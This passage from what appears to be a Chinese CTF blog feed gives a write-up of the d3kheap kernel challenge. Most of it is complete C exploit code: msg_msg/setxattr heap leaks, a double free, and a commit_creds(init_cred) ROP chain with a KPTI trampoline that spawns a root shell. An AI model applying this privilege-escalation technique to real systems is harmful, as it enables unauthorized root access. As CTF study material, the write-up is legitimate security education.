class="number">0xffffffff812b76e9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x980</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82101980</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x440</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e77440</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xde7</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82411de7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x4f0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff817894f0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xc90</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff833fac90</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x785</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff823c3785</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x990</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff810b2990</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x900</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e49900</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x8b4</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8111b8b4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xc40</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8204ac40</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x320</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8155c320</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xee0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff810d6ee0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x5e0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff810e55e0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xe80</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82f05e80</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x260</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82ec0260</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xb50</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82dd4b50</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x620</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8109e620</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xa00</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82f04a00</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x300</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff81b25300</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xbe0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82e11be0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x8b0</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8115b8b0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x5da</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff824505da</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x3c2</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff824073c2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xd80</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff82eaed80</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x5cb</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff824505cb</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x3c3</span>:</span><br><span class="line">        kernel_offset = kernel_text_leak - <span class="number">0xffffffff8240b3c3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] fill up your dict!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((kernel_offset % <span class="number">0x100000</span>) != <span class="number">0</span>) <span class="comment">// miss hit?</span></span><br><span class="line">        kernel_offset = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="keyword">return</span> kernel_offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125; msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x1234</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0xDEAD</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open d3kheap error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_heap_leak;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *pointer_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> kmsg_idx;</span><br><span class="line">    <span class="keyword">int</span> ms_qid[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_text_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kmsg_addr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr;</span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pipe_fd2[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_ops_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> fake_ops_addr;</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span> + i, <span class="number">0X1000</span> - <span class="number">8</span>);</span><br><span class="line">        ret = msgsnd(ms_qid[i], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;Z&#x27;</span>, <span class="number">0x1000</span> - <span class="number">8</span>);</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_ts = <span class="number">0x1000</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pointer_buf = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf;</span><br><span class="line">    kernel_heap_leak = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;[----data dump----][%d] %p\n&quot;, i, pointer_buf[i]);</span></span><br><span class="line">        <span class="keyword">if</span> (((pointer_buf[i] &amp; <span class="number">0xffff000000000000</span>) == <span class="number">0xffff000000000000</span>) &amp;&amp; !kernel_heap_leak &amp;&amp; (pointer_buf[i + <span class="number">3</span>] == (<span class="number">1024</span> - <span class="number">0x30</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] We got heap leak! kheap: %p\n&quot;</span>, pointer_buf[i]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;idx=&gt;%d\n&quot;</span>, (<span class="keyword">int</span>)(((<span class="keyword">char</span> *)(&amp;pointer_buf[i + <span class="number">2</span>]))[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>));</span><br><span class="line">            idx = (<span class="keyword">int</span>)(((<span class="keyword">char</span> *)(&amp;pointer_buf[i + <span class="number">2</span>]))[<span class="number">0</span>] - <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">            kernel_heap_leak = pointer_buf[i];</span><br><span class="line">            fake_ops_offset = i * <span class="number">8</span> + <span class="number">0x30</span> - <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!kernel_heap_leak)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to leak kernel heap!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    search_addr = kernel_heap_leak - <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> leaking_times = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;m_ts = <span class="number">0x2000</span> - <span class="number">0x30</span>;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;next = search_addr;</span><br><span class="line">        ((struct msg_msg *)buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">        setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] per leaking, no.%d time(s)\n&quot;</span>, leaking_times);</span><br><span class="line">        ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">0x2000</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);</span><br><span class="line">        leaking_times++;</span><br><span class="line">        <span class="keyword">if</span> (leaking_times == <span class="number">100</span> &amp;&amp; !kernel_text_leak)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">            search_addr += <span class="number">0x1000</span> - <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pointer_buf = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf;</span><br><span class="line">        <span class="keyword">if</span> (leaking_times == <span class="number">1</span> &amp;&amp; !kmsg_addr)</span><br><span class="line">        &#123;</span><br><span class="line">            kmsg_addr = pointer_buf[(<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">            fake_ops_addr = kmsg_addr - fake_ops_offset;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] fake ops addr=&gt;%p\n&quot;</span>, fake_ops_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = (<span class="number">0x1000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i &lt; (<span class="number">0x2000</span> - <span class="number">0x30</span>) / <span class="number">8</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((pointer_buf[i] &gt; <span class="number">0xffffffff81000000</span>) &amp;&amp; (pointer_buf[i] &lt; <span class="number">0xffffffffbfffffff</span>) &amp;&amp; !kernel_text_leak)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, pointer_buf[i]);</span><br><span class="line">                kernel_text_leak = pointer_buf[i];</span><br><span class="line">                kernel_offset = kernelLeakQuery(kernel_text_leak);</span><br><span class="line">                <span class="keyword">if</span> (kernel_offset == <span class="number">0xdeadbeef</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;[-] cant found kernel offset\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                kernel_base = kernel_offset + <span class="number">0xffffffff81000000</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (kernel_text_leak &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; kernel_text_leak &lt; <span class="number">0xffffffffbfffffff</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_list.next = search_addr;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_list.prev = search_addr;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)buf)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">    ret = msgrcv(ms_qid[idx], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] the gap is freed&quot;</span>);</span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] double free done!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    pipe(pipe_fd2);</span><br><span class="line">    <span class="built_in">memset</span>(pointer_buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    pointer_buf[<span class="number">1</span>] = <span class="number">0xffffffff812dbede</span> + kernel_offset;</span><br><span class="line">    pointer_buf[<span class="number">2</span>] = fake_ops_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810938f0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="number">0xffffffff82c6d580</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_cred = <span class="number">0xffffffff810d25c0</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00ff0</span> + kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> rop = <span class="number">4</span>;</span><br><span class="line">    pointer_buf[rop++] = pop_rdi;</span><br><span class="line">    pointer_buf[rop++] = init_cred;</span><br><span class="line">    pointer_buf[rop++] = commit_cred;</span><br><span class="line">    pointer_buf[rop++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x16</span>;</span><br><span class="line">    pointer_buf[rop++] = <span class="number">0</span>;</span><br><span class="line">    pointer_buf[rop++] = <span class="number">0</span>;</span><br><span class="line">    pointer_buf[rop++] = getShell;</span><br><span class="line">    pointer_buf[rop++] = user_cs;</span><br><span class="line">    pointer_buf[rop++] = user_rflags;</span><br><span class="line">    pointer_buf[rop++] = user_sp;</span><br><span class="line">    pointer_buf[rop++] = user_ss;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;196082&quot;</span>, pointer_buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gadget addr =&gt; %p\n&quot;</span>, pointer_buf[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/iShot_2022-09-16_19.17.09.png"                                     ></p><h2 id="补充一下"><a href="#补充一下" class="headerlink" title="补充一下"></a>补充一下</h2><p>这里解释一下为什么使用<code>swapgs_restore_regs_and_return_to_usermode+0x16</code>首先这里是ROP所以我们需要的是最后swapgs然后iretq，并且这里是开启了KPTI保护的，所以我们在最后还需要修改cr3寄存器。其次为什么要加上0x16呢？首先我们要知道的是前面的pop对我们来说并没有什么用。其次就是在切换完cr3之后我们还有两次pop所以我们需要保证rsp也是在可以识别的，最终根据上述要求我们必须选择<code>swapgs_restore_regs_and_return_to_usermode+0x16</code>。</p><hr><p>参考链接：<a class="link"   href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#0x01-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90" >https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#0x01-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90<i class="fas fa-external-link-alt"></i></a></p><p>题目链接：<a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3kheap.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3kheap.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里作为演示的例题为d3kheap，也是我拖了很久的复现题目，题目链接放在文章末尾。这篇文章使用的方法是作者的预期解的方法，也就是setxattr多次劫持msg_msg泄漏地址，在下一篇文章会记录第二种方法 CVE-2021-22555。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="setxattr" scheme="https://cv196082.gitee.io/tags/setxattr/"/>
    
  </entry>
  
  <entry>
    <title>kernel堆占位</title>
    <link href="https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/"/>
    <id>https://cv196082.gitee.io/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/</id>
    <published>2022-09-06T11:55:19.000Z</published>
    <updated>2022-09-06T12:06:33.546Z</updated>
    
    <content type="html"><![CDATA[<p>关于userfaultfd这里就不再提及了，不熟悉的可以看一下上一篇文章 <a href="https://cv196082.gitee.io/2022/08/16/userfaultfd/">https://cv196082.gitee.io/2022/08/16/userfaultfd/</a> </p><h2 id="setxattr"><a href="#setxattr" class="headerlink" title="setxattr"></a>setxattr</h2><p>setxattr这个系统调用是非常独特的，在kernel的利用中他可以为我们提供几乎任意大小的object分配。</p><p>setxattr的调用链如下：</p><p><code>SYS_setxattr()</code>=&gt;<code>path_setxattr()</code>=&gt;<code>setxattr()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 